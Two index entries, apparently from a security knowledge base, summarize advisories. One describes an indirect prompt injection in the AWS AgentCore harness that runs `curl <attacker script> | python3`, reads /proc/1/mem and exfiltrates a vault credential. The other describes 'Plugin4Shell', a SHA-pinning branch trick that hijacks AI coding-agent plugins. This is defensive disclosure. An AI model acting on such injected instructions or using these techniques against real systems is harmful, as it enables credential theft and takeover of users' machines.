- [Unit 42: **AWS AgentCore Harness "A Vault with a Heap-View"** — in the DEFAULT configuration an **indirect prompt injection** (hidden HTML comment in a support ticket: `curl <attacker script> | python3`) yields **root code execution inside the harness process itself**: the built-in `shell` + `file_operations` tools ship **enabled in every session unless `allowedTools` is scoped**, and the shell runs as the **same UID as PID 1**, so `/proc/1/mem` is readable and **every AgentCore Identity vault credential the harness ever resolves sits PLAINTEXT in that heap** — Unit 42 scanned maps+mem, exfiltrated the **operator's service-account JWT (1,034 B) + downstream MCP URL** to a webhook, then **replayed it from a laptop with no AWS credentials** to read customer PII; the invoking user is only allowed `InvokeHarness` — the vault holds the operator's long-lived credential, so injection through the lowest-privilege caller escalates to the highest-privilege secret; **AWS closed HackerOne #3747844 as informative** (Jun 10, merged with #3737800) under shared responsibility, citing customer-side `allowedTools` scoping + egress filtering; `allowedTools` scopes at **InvokeHarness time, not CreateHarness** (easy to miss); durable reads: **the shell tool is the new perimeter** (whatever it can touch, an injection can touch — model judgment is not a boundary) and **vaults protect at rest and in transit, NOT in use**; runtime builders must resolve credentials where the shell cannot read them or sandbox the shell away from the resolver; no CVE, no ITW reported; mitigation: scope allowedTools per session, least-privilege every vault service account, watch harness egress — any endpoint off the integration list is active injection not drift (Unit 42, Sep 18, 2026)](patterns/unit42-aws-agentcore-harness-shell-identity-vault-heap-exfiltration-september-2026.md)
- [AIR: **Plugin4Shell** — **zero-click RCE in ALL four major AI coding agents** (Claude Code, Codex, GitHub Copilot, Gemini CLI) via a **plugin SHA-pinning bypass**: every agent checks out the pinned commit but **never verifies the checkout landed there**, so an attacker who controls the plugin repo creates **a branch named like the pinned 40-hex SHA and makes it the default** — git prefers a ref over an object id of the same name (only a "refname is ambiguous" warning), so `git checkout <pinned-sha>` lands on **attacker code while the pin still looks honored**; Gemini CLI has a separate variant where a **default branch named `FETCH_HEAD`** shadows the fetched commit; **background plugin auto-update (default in Claude Code and Codex) makes it zero-click** — the marketplace re-pins to a routine new commit, the attacker branch-swaps it, and every already-installed, already-reviewed plugin receives malicious code with no user action. Doing everything right (reviewed plugin, trusted marketplace, pinned exactly as the security model intends) does not protect you; the pin resolves inside the agent, so **no marketplace can fix it** — the one-line fix is asserting `git rev-parse HEAD` equals the pinned SHA after checkout. Vendor split: **Claude Code patched 2.1.179 (Jun 17), Codex patched 0.146.0 (Aug 12), Microsoft shipped NO fix for Copilot, Google declined to patch and DEPRECATED Gemini CLI (Aug 4) leaving every install permanently exposed** (migrate to Antigravity). GitHub says GitHub rejects 40-hex branch names so it "cannot be exploited on GitHub"; AIR: marketplaces on **Bitbucket/self-hosted git are supported configurations** (Anthropic's own docs list them), so agents stay exposed. Chain proven end to end by AIR's prior work: **Story of Skills ~26,000 agents** (plant-then-rug-pull) + **SkillJacking 925 hijacked skills / 134,000 agents** (repo takeover) — Plugin4Shell defeats the containment built for exactly those attacks; found May 2026, disclosed to vendors June 2026; no in-the-wild exploitation reported; scale claims are vendor-reported (AIR, Sep 17, 2026)](patterns/plugin4shell-agent-plugin-sha-pinning-bypass-air-september-2026.md)
